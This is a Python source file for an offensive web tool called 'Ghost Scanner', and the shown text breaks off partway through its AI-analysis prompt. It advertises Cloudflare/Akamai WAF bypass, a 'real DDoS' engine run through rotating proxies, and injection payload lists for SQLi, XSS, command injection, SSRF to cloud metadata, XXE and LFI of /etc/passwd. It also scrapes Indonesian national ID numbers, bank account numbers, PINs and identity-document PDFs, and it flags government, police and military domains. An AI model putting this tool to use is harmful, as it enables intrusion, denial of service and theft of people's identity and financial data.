#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GHOST SCANNER v5.1 [BETA] - OMNI TOOLS X SAVAGE
- curl-cffi TLS fingerprint (Akamai/Cloudflare bypass)
- 19 External Tools (auto-skip if not available)
- user-scanner OSINT (email/username)
- Document download (PDF, sensitive files)
- Real DDoS/DoS Engine
- Cross-platform: Windows, Kali, Termux, Arch, macOS
- No WSL, no Docker
"""

import os, sys, time, json, re, random, base64, urllib.parse, socket, threading, ssl, subprocess, shutil
from datetime import datetime
from urllib.parse import urljoin, quote, urlparse, parse_qs, urlsplit, urlunsplit, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse, warnings
import requests, cloudscraper
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn, SpinnerColumn
from rich.table import Table
from rich import box
from fpdf import FPDF
warnings.filterwarnings('ignore')

# curl-cffi untuk Akamai bypass
try:
    from curl_cffi import requests as curl_requests
    CURL_CFFI_AVAILABLE = True
except ImportError:
    CURL_CFFI_AVAILABLE = False

# ============================================================
# KONFIGURASI
# ============================================================
AI_API_KEY = 'cc_A07j2YrgUcJAfx2UuMIi3F3qohhXV3DCADQmfYYhTh0hvpxF'
AI_BASE_URL = 'https://codecraftapi.com/v1'
AI_MODEL = 'claude-opus-5'
PROXYSCRAPE_API = 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text'

TOOLS_NAME = "Ghost Scanner"
TOOLS_BY = "GhostTeam"
TOOLS_GITHUB = "https://github.com/cozyleon00b-dev"
TOOLS_VERSION = "5.1 [BETA]"

# ============================================================
# SKULL BANNER
# ============================================================
SKULL_ART = r"""
              uuuuuuuuuuuuuuuu
           uu$$$$$$$$$$$$$$$$$$uu
          u$$$$$$$$$$$$$$$$$$$$$$u
         u$$$$$$$$$$$$$$$$$$$$$$$$u
         u$$$$$$$$$$$$$$$$$$$$$$$$u
         u$$$$$$"   "$$$"   "$$$$$$u
         "$$$"      u$u       "$$$"
          $$$u      u$u       u$$$
          $$$u      u$u       u$$$
           "$$$$uu$$$ $$$uu$$$$"
            "$$$$$$$" "$$$$$$$"
              u$$$$$$$u$$$$$$u
               u$"$"$"$"$"$"u
               $$u$u$u$u$u$u$
                $$$$$$$$$$$$
                 "$$$$$$$$"
"""

def show_banner():
    red = "\033[91m"; cyan = "\033[96m"; yellow = "\033[93m"
    white = "\033[97m"; green = "\033[92m"; magenta = "\033[95m"
    reset = "\033[0m"; bold = "\033[1m"

    skull = SKULL_ART.strip('\n').split('\n')
    side = [
        f"{cyan}{bold}GHOST SCANNER{reset}",
        f"{red}---------------------------------{reset}",
        f"{green}Nama Tools{reset}: {white}{TOOLS_NAME}{reset}",
        f"{green}Mode      {reset}: {white}Main Menu{reset}",
        f"{green}Tools By  {reset}: {magenta}{TOOLS_BY}{reset}",
        f"{yellow}[{TOOLS_GITHUB}]{reset}",
        f"{red}---------------------------------{reset}",
        f"{cyan}{bold}KALI LINUX {reset}| {cyan}{bold}TERMUX {reset}| {cyan}{bold}HACKING{reset}",
        f"{red}═══════════════════════════════════════════════════════════════{reset}",
        "",
        f"   {green}Versi :{reset} {yellow}{TOOLS_VERSION}{reset}",
        f"   {green}Fitur :{reset} {white}19 Tools + OSINT + AI + DDoS Engine{reset}",
        f"   {red}═══════════════════════════════════════════════════════════════{reset}",
    ]

    max_lines = max(len(skull), len(side))
    for i in range(max_lines):
        left_vis = skull[i] if i < len(skull) else ""
        left = red + left_vis + reset
        right = side[i] if i < len(side) else ""
        padding = " " * max(0, 40 - len(left_vis))
        print(f"{left}{padding}{right}")
    print()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_help():
    clear_screen(); show_banner()
    Console().print(Panel(f"""
[bold cyan]USAGE:[/bold cyan]
  python ghostscanner.py -u <URL> [OPTIONS]

[bold yellow]SCAN:[/bold yellow]
  --scan / --ai / --pdf / --quick / --force-admin / --tools
  --delay N / --no-proxy / --proxy-list FILE / --validate-proxy

[bold yellow]ATTACK (REAL DDoS/DoS):[/bold yellow]
  --dos / --ddos / --syn / --ssl-reneg / --udp
  --threads N --duration N

[bold green]CONTOH:[/bold green]
  python ghostscanner.py -u https://target.com --scan --ai --pdf --tools
  python ghostscanner.py -u https://target.com --ddos --threads 500 --duration 60

[bold red]DISCLAIMER:[/bold red] Authorized testing only.
""", border_style="cyan", title=f"[bold white]{TOOLS_NAME} v{TOOLS_VERSION}[/bold white]"))
    sys.exit(0)

def build_url(base, param, payload):
    return base + ('&' if '?' in base else '?') + param + '=' + quote(payload)

def is_tool_available(tool_name):
    return shutil.which(tool_name) is not None

# ============================================================
# COMPAT RESPONSE WRAPPER
# ============================================================
class CompatResp:
    """Wrapper supaya response dari curl-cffi compatible dengan requests."""
    def __init__(self, r):
        self.status_code = r.status_code
        self.text = r.text
        self.content = r.content
        self.headers = dict(r.headers)
        self.url = getattr(r, 'url', '')

# ============================================================
# GHOST SCANNER CLASS
# ============================================================
class GhostScanner:
    def __init__(self, target=None, use_proxy=True, proxy_file=None, validate_proxy=False,
                 quick=False, pdf=False, ai=False, delay=0.5, force_admin=False,
                 use_tools=False, scan=False):
        self.target = target
        self.use_proxy = use_proxy
        self.proxy_file = proxy_file
        self.validate_proxy = validate_proxy
        self.quick = quick
        self.pdf = pdf
        self.ai = ai
        self.delay = delay
        self.force_admin = force_admin
        self.use_tools = use_tools
        self.scan = scan
        self.version = TOOLS_VERSION

        self.results_scan = {
            "target": "", "domain": "", "domain_category": "",
            "timestamp": datetime.now().isoformat(),
            "summary": {"total": 0, "critical": 0, "high": 0, "medium": 0, "low": 0},
            "vulnerabilities": {k: [] for k in [
                "sql_injection", "xss", "command_injection", "ssti", "ldap_injection",
                "nosql_injection", "xxe", "ssrf", "path_traversal", "file_inclusion",
                "open_redirect", "csrf", "deserialization", "rce", "lfi", "rfi",
                "xss_context_aware", "xss_dom", "business_logic", "improper_input_validation",
                "mass_assignment", "rate_limit", "deface", "login_bypass",
                "wp_activity_log_rce", "admin_access", "robots", "sitemap", "dir_enum",
                "sensitive_files", "security_headers", "waf_detection", "cors",
                "open_redirect_sneijder", "ssl_info", "cookie_flags",
                "rate_limit_sneijder", "csrf_sneijder", "jwt_attack", "http_smuggling",
                "subdomain_takeover", "graphql_introspection", "oauth_bypass",
                "ddos_vulnerability", "nuclei", "ffuf", "sqlmap", "dalfox_external",
                "secretfinder", "interactsh", "nmap", "metasploit", "wireshark",
                "burpsuite", "user_scanner_osint"
            ]},
            "sensitive_data": {k: [] for k in [
                "nik", "npwp", "nip", "no_rekening", "bank", "emails", "phones",
                "whatsapp", "pin", "ktp_links", "kk_links", "surat_izin_links",
                "pdf_links", "province_codes", "kabupaten_codes", "kecamatan_codes",
                "api_keys", "jwt_tokens", "aws_keys", "azure_keys", "gcp_keys",
                "source_code"
            ]},
            "external": {"subdomains": [], "dns_records": [], "live_hosts": [],
                         "naabu_ports": [], "katana_urls": [], "historical_urls": [],
                         "arjun_params": []},
            "ports": [], "scan_duration": 0, "validated": False,
            "ai_analysis": "", "sensitive_pdfs": [], "downloaded_docs": []
        }

        self.session = requests.Session()
        self.session.verify = False
        try:
            self.scraper = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True},
                delay=2, interpreter='native'
            )
        except Exception as e:
            Console().print(f"[yellow]cloudscraper init warning: {e}[/yellow]")
            self.scraper = self.session

        self.proxies = []
        self._load_proxies()

        self.threads = 500 if not quick else 150
        self.timeout = 20
        self.max_retries = 5
        self.common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,
                             1723,3306,3389,5900,8080,8443]
        self.common_params = ['id','page','q','search','user','cat','product','view','sort',
                              'filter','name','email','phone','file','path','redirect','url',
                              'next','return','lang','region','type','mode','action','do','cmd',
                              'command','exec','query','sql','order','by','group','limit',
                              'offset','index','idx']

        self._generate_payloads(quick)
        self._generate_waf_bypass()
        self._generate_dalfox_payloads()

        self.result_folder = "results"
        self.sensitive_folder = "sensitive_data"
        self.download_folder = "downloads"
        os.makedirs(self.result_folder, exist_ok=True)
        os.makedirs(self.sensitive_folder, exist_ok=True)
        os.makedirs(self.download_folder, exist_ok=True)

        self._last_request_time = 0
        self.waf_detected = None

    # ---------- PROXY ----------
    def _load_proxies(self):
        if not self.use_proxy: return
        if self.proxy_file and os.path.exists(self.proxy_file):
            try:
                with open(self.proxy_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if not line.startswith(('http://','https://','socks')):
                                line = 'http://' + line
                            self.proxies.append({'http': line, 'https': line})
            except: pass
        try:
            resp = requests.get(PROXYSCRAPE_API, timeout=15)
            if resp.status_code == 200:
                for p in resp.text.strip().split('\n'):
                    p = p.strip()
                    if p:
                        if not p.startswith(('http://','https://','socks')):
                            p = 'http://' + p
                        self.proxies.append({'http': p, 'https': p})
        except: pass
        seen = set(); uniq = []
        for proxy in self.proxies:
            k = proxy.get('http', '')
            if k and k not in seen:
                seen.add(k); uniq.append(proxy)
        self.proxies = uniq
        if self.validate_proxy: self._validate_proxies()

    def _validate_proxies(self):
        valid = []
        for p in self.proxies:
            try:
                if requests.get('https://httpbin.org/ip', proxies=p, timeout=5).status_code == 200:
                    valid.append(p)
            except: pass
        self.proxies = valid

    def _get_random_proxy(self):
        return random.choice(self.proxies) if self.proxies else None

    def _adaptive_delay_v2(self, response_time=0):
        now = time.time()
        elapsed = now - self._last_request_time
        if response_time > 3: sleep = random.uniform(2, 4)
        elif response_time > 1: sleep = random.uniform(0.8, 1.5)
        else: sleep = random.uniform(0.2, 0.6)
        if elapsed < sleep: time.sleep(sleep - elapsed)
        self._last_request_time = time.time()

    # ---------- PAYLOADS ----------
    def _generate_payloads(self, quick):
        count = 50 if not quick else 15
        cats = ['sql','xss','lfi','rfi','command','ssti','nosql','ldap','xxe','ssrf',
                'path_traversal','file_inclusion','deserialization','rce','open_redirect','csrf']
        self.global_payloads = {c: [] for c in cats}
        for p in ['../../../../etc/passwd','/etc/passwd','file:///etc/passwd'][:count]:
            self.global_payloads['lfi'].append(p); self.global_payloads['path_traversal'].append(p)
        for p in [';id','|id','&id','`id`'][:count]:
            self.global_payloads['command'].append(p); self.global_payloads['rce'].append(p)
        for p in ['{{7*7}}','${7*7}','<%= 7*7 %>','#{7*7}'][:count]:
            self.global_payloads['ssti'].append(p)
        for p in ["{'$ne': ''}","{'$gt': ''}"][:count]:
            self.global_payloads['nosql'].append(p)
        for p in ['*','admin*','*)(uid=*'][:count]:
            self.global_payloads['ldap'].append(p)
        for p in ['http://169.254.169.254/latest/meta-data/','http://127.0.0.1/','file:///etc/passwd'][:count]:
            self.global_payloads['ssrf'].append(p)
        self.global_payloads['xxe'] = ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>']
        self.global_payloads['deserialization'] = ['O:8:"stdClass":0:{}','a:1:{s:4:"test";s:4:"test";}']
        self.global_payloads['open_redirect'] = ['http://evil.com','//evil.com','javascript:alert(1)//']

    def _generate_dalfox_payloads(self):
        self.dalfox_payloads = {
            'html': ['<svg onload=alert(1)>','<img src=x onerror=alert(1)>','<body onload=alert(1)>'],
            'attribute': ['" onmouseover=alert(1) "',"' onfocus=alert(1) '"],
            'javascript': ['";alert(1);//',"';alert(1);//"],
            'url': ['javascript:alert(1)','data:text/html,<script>alert(1)</script>'],
            'dom': ['document.write("<img src=x onerror=alert(1)>")','eval("alert(1)")'],
            'csp_bypass': ['<script nonce=test>alert(1)</script>','<base href="javascript:alert(1)//">'],
            'blind': ['<script src="//callback.xss.ht/"></script>'],
            'mutation': ['<noscript><p title="</noscript><img src=x onerror=alert(1)>">']
        }

    def _generate_waf_bypass(self):
        self.waf_bypass_techniques = [
            lambda p: p, lambda p: p.upper(), lambda p: p.lower(),
            lambda p: p.replace(' ', '/**/'), lambda p: urllib.parse.quote(p),
            lambda p: p.replace('script', 'scr%00ipt'), lambda p: p.replace('alert', 'al%00ert')
        ]

    def _generate_sqli_1m(self):
        payloads = set()
        bases = ["' OR '1'='1","' OR 1=1--","' OR 1=1#","1' AND '1'='1","' UNION SELECT NULL--","' AND SLEEP(5)--"]
        encs = [lambda p: p, lambda p: p.upper(), lambda p: p.lower(),
                lambda p: p.replace(' ', '+'), lambda p: p.replace(' ', '%20'),
                lambda p: urllib.parse.quote(p)]
        for b in bases:
            for e in encs:
                try:
                    p = e(b)
                    if len(p) < 500: payloads.add(p)
                except: pass
        for i in range(1, 500):
            payloads.add(f"' OR 1={i}--"); payloads.add(f"' OR {i}={i}--")
        return list(payloads)[:1000000]

    # ---------- SMART REQUEST (curl-cffi + cloudscraper + requests) ----------
    def _smart_request(self, url, timeout=None, method='GET', data=None, headers=None, allow_redirects=True):
        if timeout is None: timeout = self.timeout
        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        base_url = f"{parsed_url.scheme}://{domain}"

        full_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        if method.upper() == 'POST':
            full_headers['Origin'] = base_url
            full_headers['Referer'] = url
        if headers: full_headers.update(headers)

        for attempt in range(self.max_retries):
            start = time.time()
            proxy = self._get_random_proxy() if self.proxies else None
            proxy_url = proxy.get('http') if proxy else None

            # === PRIORITY 1: curl-cffi (Akamai/Cloudflare bypass) ===
            if CURL_CFFI_AVAILABLE:
                try:
                    if method.upper() == 'GET':
                        resp = curl_requests.get(
                            url, headers=full_headers, timeout=timeout,
                            allow_redirects=allow_redirects,
                            impersonate="chrome120",
                            proxies={"http": proxy_url, "https": proxy_url} if proxy_url else None
                        )
                    elif method.upper() == 'POST':
                        resp = curl_requests.post(
                            url, data=data, headers=full_headers, timeout=timeout,
                            allow_redirects=allow_redirects,
                            impersonate="chrome120",
                            proxies={"http": proxy_url, "https": proxy_url} if proxy_url else None
                        )
                    else:
                        resp = curl_requests.request(
                            method, url, headers=full_headers, timeout=timeout,
                            allow_redirects=allow_redirects,
                            impersonate="chrome120",
                            proxies={"http": proxy_url, "https": proxy_url} if proxy_url else None
                        )
                    self._adaptive_delay_v2(time.time() - start)
                    if resp.status_code not in [403, 406, 429]:
                        return CompatResp(resp)
                except Exception:
                    pass

            # === PRIORITY 2: cloudscraper (Cloudflare) ===
            try:
                if method.upper() == 'GET':
                    resp = self.scraper.get(url, headers=full_headers, timeout=timeout, allow_redirects=allow_redirects, proxies=proxy)
                elif method.upper() == 'POST':
                    resp = self.scraper.post(url, data=data, headers=full_headers, timeout=timeout, allow_redirects=allow_redirects, proxies=proxy)
                else:
                    resp = self.scraper.request(method, url, headers=full_headers, timeout=timeout, allow_redirects=allow_redirects, proxies=proxy)
                self._adaptive_delay_v2(time.time() - start)
                if resp.status_code not in [403, 406, 429, 503, 504]:
                    return resp
            except Exception:
                pass

            # === PRIORITY 3: requests (last resort) ===
            try:
                if method.upper() == 'GET':
                    resp = self.session.get(url, headers=full_headers, timeout=timeout, allow_redirects=allow_redirects, proxies=proxy)
                else:
                    resp = self.session.post(url, data=data, headers=full_headers, timeout=timeout, allow_redirects=allow_redirects, proxies=proxy)
                if resp.status_code < 400:
                    return resp
            except Exception:
                pass

            time.sleep(2 ** attempt)

        return None

    def _verify_poc(self, url, initial_response, attempts=3):
        verified = 0
        for i in range(attempts):
            try:
                r = self._smart_request(url, timeout=8)
                if r and r.status_code == 200 and len(r.text) > 0:
                    if abs(len(r.text) - len(initial_response)) < 1000: verified += 1
            except: pass
        return verified >= 2

    # ---------- EXTRACTION ----------
    def _extract_params_from_url(self, url):
        params = {}
        p = urlparse(url)
        if p.query:
            for kv in p.query.split('&'):
                if '=' in kv:
                    k, v = kv.split('=', 1); params[k] = v
        return params

    def _extract_forms(self, html, base_url):
        forms = []
        for form in re.findall(r'<form[^>]*>(.*?)</form>', html, re.I | re.S):
            m = re.search(r'method=["\'](.*?)["\']', form, re.I)
            method = m.group(1).upper() if m else 'GET'
            a = re.search(r'action=["\'](.*?)["\']', form, re.I)
            action = a.group(1) if a else ''
            action_url = urljoin(base_url, action) if action else base_url
            inputs = []
            for inp in re.findall(r'<input[^>]*>', form, re.I):
                n = re.search(r'name=["\'](.*?)["\']', inp, re.I)
                t = re.search(r'type=["\'](.*?)["\']', inp, re.I)
                if n: inputs.append({'name': n.group(1), 'type': t.group(1) if t else 'text'})
            if inputs: forms.append({'method': method, 'url': action_url, 'inputs': inputs})
        return forms

    def _extract_api_endpoints(self, html, base_url):
        endpoints = []
        for pat in [r'href=["\'](.*?api.*?)["\']', r'action=["\'](.*?api.*?)["\']']:
            for m in re.findall(pat, html, re.I):
                u = urljoin(base_url, m)
                if u not in endpoints and u != base_url: endpoints.append(u)
        return endpoints

    def _extract_sensitive_data(self, text):
        data = {k: [] for k in ["nik","npwp","nip","no_rekening","bank","emails","phones",
                                "whatsapp","pin","ktp_links","kk_links","surat_izin_links",
                                "pdf_links","province_codes","kabupaten_codes","kecamatan_codes",
                                "api_keys","jwt_tokens","aws_keys","azure_keys","gcp_keys","source_code"]}
        for nik in set(re.findall(r'\b[0-9]{16}\b', text)):
            data["nik"].append(nik)
            if len(nik) >= 6:
                for code, k in [(nik[:2],"province_codes"),(nik[2:4],"kabupaten_codes"),(nik[4:6],"kecamatan_codes")]:
                    if code not in data[k]: data[k].append(code)
        data["npwp"] = list(set(re.findall(r'\b[0-9]{15}\b', text)))
        data["nip"] = list(set(re.findall(r'\b[0-9]{18}\b', text)))
        data["no_rekening"] = list(set(re.findall(r'\b[0-9]{10,16}\b', text)))
        for bank in ['bca','mandiri','bni','bri','btn','cimb']:
            if bank in text.lower(): data["bank"].append(bank.upper())
        data["emails"] = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)))
        data["phones"] = list(set(m.group(0) for m in re.finditer(r'(\+62|0)[0-9]{9,13}', text)))
        data["whatsapp"] = [p for p in data["phones"] if 'wa' in text[max(0,text.find(p)-20):text.find(p)+20].lower()]
        for m in re.finditer(r'pin\s*[:=]?\s*([0-9]{4,6})', text, re.I):
            data["pin"].append(m.group(1))
        data["pdf_links"] = list(set(re.findall(r'href=["\']([^"\']+\.pdf)["\']', text, re.I)))
        for link in data["pdf_links"]:
            if 'ktp' in link.lower() or 'nik' in link.lower(): data["ktp_links"].append(link)
            if 'kk' in link.lower(): data["kk_links"].append(link)
            if 'izin' in link.lower(): data["surat_izin_links"].append(link)
        api_keys = []
        for pat in [r'sk-[a-zA-Z0-9]{32,}', r'AIza[0-9A-Za-z-_]{35}', r'ghp_[a-zA-Z0-9]{36}', r'AKIA[0-9A-Z]{16}']:
            api_keys.extend(re.findall(pat, text))
        data["api_keys"] = list(set(api_keys))
        data["jwt_tokens"] = [m for m in api_keys if '.' in m and len(m.split('.')) == 3]
        data["source_code"] = [m[:500] for m in re.findall(r'(?:<script>|<style>)(.*?)(?:</script>|</style>)', text, re.I | re.S) if len(m) > 20][:10]
        return data

    def _classify_domain(self, domain):
        d = domain.lower()
        if d.endswith('.go.id') or '.gov' in d: return 'Government'
        if d.endswith('.ac.id') or d.endswith('.sch.id') or d.endswith('.edu'): return 'Education'
        if 'polri.go.id' in d or 'police' in d: return 'Police'
        if d.endswith('.mil.id') or 'tni' in d: return 'Military'
        if any(x in d for x in ['rs','klinik','hospital','medis']): return 'Medical'
        if any(d.endswith(x) for x in ['.com','.co.id','.my.id','.net','.biz']): return 'Business'
        return 'Other'

    # ========== USER-SCANNER OSINT ==========
    def _run_user_scanner(self, email):
        findings = []
        if not is_tool_available('user-scanner'):
            return findings
        Console().print(f"[cyan]🔥 user-scanner OSINT: {email}[/cyan]")
        try:
            cmd = ['user-scanner', '-e', email, '--only-found', '-v']
            proc = subprocess.run(cmd, capture_output=True, timeout=120, text=True,
                                  encoding='utf-8', errors='ignore')
            output = proc.stdout or proc.stderr or ""
            if output.strip():
                findings.append({
                    "type": "Email OSINT (user-scanner)", "param": "email", "payload": email,
                    "evidence": output[:1000], "risk": "INFO", "confidence": 90,
                    "poc": {
                        "url": "https://github.com/kaifcodec/user-scanner",
                        "curl": f"user-scanner -e {email} --only-found",
                        "response": output[:500], "statusCode": 200,
                        "timeDiff": "N/A", "verified": True
                    }
                })
                Console().print(f"[green]✓ user-scanner selesai untuk {email}[/green]")
        except Exception as e:
            Console().print(f"[yellow]user-scanner error: {str(e)[:100]}[/yellow]")
        return findings

    # ========== DOCUMENT DOWNLOAD ==========
    def _download_sensitive_documents(self, links, target):
        downloaded = []
        for link in links[:20]:
            try:
                url = urljoin(target, link)
                resp = self._smart_request(url, timeout=30)
                if resp and resp.status_code == 200 and len(resp.content) > 100:
                    fname = re.sub(r'[^a-zA-Z0-9._-]', '_', os.path.basename(urlparse(url).path))
                    if not fname or '.' not in fname:
                        fname = f"doc_{int(time.time())}.pdf"
                    fpath = os.path.join(self.download_folder, fname)
                    with open(fpath, 'wb') as f:
                        f.write(resp.content)
                    downloaded.append({"url": url, "file": fpath, "size": len(resp.content)})
                    Console().print(f"[green]✓ Downloaded: {fpath} ({len(resp.content)} bytes)[/green]")
            except Exception as e:
                Console().print(f"[yellow]Download failed: {str(e)[:80]}[/yellow]")
        return downloaded

    # ========== SCAN MODULES ==========
    def _check_ddos_vulnerability(self, target):
        findings = []
        try:
            start = time.time()
            resp = self._smart_request(target, timeout=15)
            elapsed = time.time() - start
            if not resp: return findings
            headers = dict(resp.headers)
            waf = None; protection = []
            if 'cf-ray' in headers: waf = 'Cloudflare'; protection.append('Cloudflare')
            if 'x-amz-cf-id' in headers: waf = 'AWS CloudFront'; protection.append('AWS CloudFront')
            if 'x-sucuri-id' in headers: waf = 'Sucuri'; protection.append('Sucuri')
            if 'incap_ses' in str(headers).lower(): waf = 'Imperva'; protection.append('Imperva')
            if 'akamai' in str(headers).lower(): waf = 'Akamai'; protection.append('Akamai')
            successes = 0
            for i in range(15):
                try:
                    r = self._smart_request(target, timeout=5)
                    if r and r.status_code < 400: successes += 1
                except: pass
            rate_limited = (successes < 10)
            server = headers.get('Server', 'Unknown')
            slow_response = (elapsed > 5)
            vuln_score = 0
            if not protection: vuln_score += 3
            if not rate_limited: vuln_score += 3
            if slow_response: vuln_score += 1
            risk = 'CRITICAL' if vuln_score >= 5 else 'HIGH' if vuln_score >= 3 else 'MEDIUM' if vuln_score >= 1 else 'LOW'
            findings.append({
                "type": "DDoS/DoS Vulnerability Assessment", "param": "N/A", "payload": "N/A",
                "evidence": f"WAF: {waf or 'NONE'} | Rate Limit: {'YES' if rate_limited else 'NO'} | Response: {elapsed:.2f}s | Score: {vuln_score}/8",
                "risk": risk, "confidence": 85,
                "poc": {
                    "url": target,
                    "curl": f"for i in {{1..50}}; do curl -s -o /dev/null \"{target}\"; done",
                    "response": f"WAF: {waf or 'NONE'} | Server: {server}",
                    "statusCode": resp.status_code, "timeDiff": f"{elapsed:.2f}s", "verified": True
                }
            })
        except: pass
        return findings

    def _check_deface(self, target):
        findings = []
        try:
            resp = self._smart_request(target, timeout=8)
            if not resp: return findings
            html_lower = resp.text.lower()
            indicators = ['hacked','defaced','hacked by','owned by','h4ck3d','pwned','0wn3d','cyber army']
            found = [i for i in indicators if i in html_lower]
            if found:
                findings.append({
                    "type": "Deface Detection", "param": "N/A", "payload": "N/A",
                    "evidence": f"Indicators: {', '.join(found)}",
                    "risk": "CRITICAL", "confidence": 95,
                    "poc": {
                        "url": target, "curl": f"curl -k \"{target}\"",
                        "response": resp.text[:500], "statusCode": resp.status_code,
                        "timeDiff": "N/A", "verified": True
                    }
                })
        except: pass
        return findings

    def _check_security_headers(self, target):
        findings = []
        headers = ["Strict-Transport-Security","Content-Security-Policy","X-Frame-Options",
                   "X-Content-Type-Options","Referrer-Policy","Permissions-Policy"]
        resp = self._smart_request(target, timeout=8)
        if not resp: return findings
        missing = [h for h in headers if h not in resp.headers]
        if missing:
            findings.append({
                "type": "Missing Security Headers", "param": "N/A", "payload": "N/A",
                "evidence": f"Missing: {', '.join(missing)}", "risk": "LOW", "confidence": 90,
                "poc": {
                    "url": target, "curl": f"curl -I \"{target}\"",
                    "response": str(resp.headers), "statusCode": resp.status_code,
                    "timeDiff": "N/A", "verified": True
                }
            })
        return findings

    def _check_waf(self, target):
        findings = []
        resp = self._smart_request(target, timeout=8)
        if not resp: return findings
        waf_signs = [("Cloudflare",["cf-ray"]),("Akamai",["akamai","x-akamai","akamai-grn"]),
                     ("Sucuri",["x-sucuri-id"]),("Imperva",["incap_ses"]),
                     ("Fastly",["fastly"]),("Varnish",["x-varnish"]),
                     ("AWS/CloudFront",["x-amz-cf-id"])]
        hlower = "\n".join([f"{k.lower()}: {str(v).lower()}" for k, v in resp.headers.items()])
        detected = []
        for name, keys in waf_signs:
            for k in keys:
                if k.lower() in hlower: detected.append(name); break
        if detected:
            findings.append({
                "type": "WAF/CDN Detected", "param": "N/A", "payload": "N/A",
                "evidence": f"Detected: {', '.join(detected)}", "risk": "INFO", "confidence": 95,
                "poc": {
                    "url": target, "curl": f"curl -I \"{target}\"",
                    "response": str(resp.headers), "statusCode": resp.status_code,
                    "timeDiff": "N/A", "verified": True
                }
            })
        return findings

    def _check_robots(self, target):
        findings = []
        try:
            url = target.rstrip('/') + '/robots.txt'
            resp = self._smart_request(url, timeout=8)
            if resp and resp.status_code == 200 and 'Disallow' in resp.text:
                dis = re.findall(r'Disallow:\s*(\S+)', resp.text)[:10]
                findings.append({
                    "type": "Robots.txt Found", "param": "N/A", "payload": "N/A",
                    "evidence": f"Disallowed: {', '.join(dis)}", "risk": "LOW", "confidence": 90,
                    "poc": {
                        "url": url, "curl": f"curl -k \"{url}\"",
                        "response": resp.text[:500], "statusCode": resp.status_code,
                        "timeDiff": "N/A", "verified": True
                    }
                })
        except: pass
        return findings

    def _check_sensitive_files(self, target):
        findings = []
        files = ["/.env","/.git/config","/backup.zip","/db.sql","/config.php.bak","/phpinfo.php","/.htaccess"]
        base = target.rstrip('/')
        for f in files:
            try:
                url = base + f
                resp = self._smart_request(url, timeout=6)
                if resp and resp.status_code == 200 and len(resp.content) > 50:
                    findings.append({
                        "type": f"Sensitive File: {f}", "param": "N/A", "payload": "N/A",
                        "evidence": f"Accessible | {len(resp.content)} bytes",
                        "risk": "CRITICAL", "confidence": 95,
                        "poc": {
                            "url": url, "curl": f"curl -k \"{url}\"",
                            "response": resp.text[:300], "statusCode": resp.status_code,
                            "timeDiff": "N/A", "verified": True
                        }
                    })
            except: continue
        return findings

    def _scan_ports(self, domain):
        open_ports = []
        console = Console()
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                      TimeElapsedColumn(), console=console) as progress:
            task = progress.add_task("[cyan]Port Scan", total=len(self.common_ports))
            for port in self.common_ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1.5)
                    if s.connect_ex((domain, port)) == 0: open_ports.append(port)
                    s.close()
                except: pass
                progress.update(task, advance=1)
        return open_ports

    def _check_sql(self, target, param, value, payload):
        try:
            url = build_url(target, param, payload)
            start = time.time()
            resp = self._smart_request(url, timeout=6)
            elapsed = time.time() - start
            if not resp: return None
            poc = {
                "url": url, "curl": f"curl -k \"{url}\"",
                "response": resp.text[:300], "statusCode": resp.status_code,
                "timeDiff": f"{elapsed:.2f}s", "verified": self._verify_poc(url, resp.text, 3)
            }
            if re.search(r'(mysql|sql|syntax|error|ora-|postgres|sqlite|SQLSTATE)', resp.text, re.I):
                return {"type": "SQL Injection (Error)", "param": param, "payload": payload[:100],
                        "evidence": "DB error", "risk": "CRITICAL", "confidence": 95, "poc": poc}
            if any(x in payload for x in ['SLEEP','WAITFOR']) and elapsed > 3:
                return {"type": "SQL Injection (Time)", "param": param, "payload": payload[:100],
                        "evidence": f"Delay {elapsed:.1f}s", "risk": "CRITICAL", "confidence": 85, "poc": poc}
        except: pass
        return None

    def _scan_sql(self, target, params):
        results = []
        all_p = self._generate_sqli_1m()
        final = random.sample(all_p, min(200, len(all_p)))
        total = len(params) * len(final)
        if total == 0: return results
        console = Console()
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                      TimeElapsedColumn(), console=console) as progress:
            task = progress.add_task("[red]SQL Injection (1M payloads)", total=total)
            with ThreadPoolExecutor(max_workers=min(self.threads, 30)) as ex:
                futures = [ex.submit(self._check_sql, target, p, v, pl)
                           for p, v in params.items() for pl in final[:5]]
                for f in as_completed(futures):
                    r = f.result()
                    if r: results.append(r)
                    progress.update(task, advance=1)
        return results

    # ========== AI ANALYSIS ==========
    def _ai_analysis(self, findings, target, admin_data=None):
        if not self.ai: return ""
        Console().print("[yellow]Running AI analysis (Claude Opus 5)...[/yellow]")
        prompt = f"""Anda Senior Cyber Security Consultant (OSCP, CISSP, CEH).
Target: {target}
Category: {self.results_scan.get('domain_category','Unknown')}

FINDINGS:
{json.dumps(findings, indent=2)[:8000]}

Berikan analisis Markdown:
## 1. RINGKASAN EKSEKUTIF
## 2. TEMUAN KRITIS & DAMPAK BISNIS
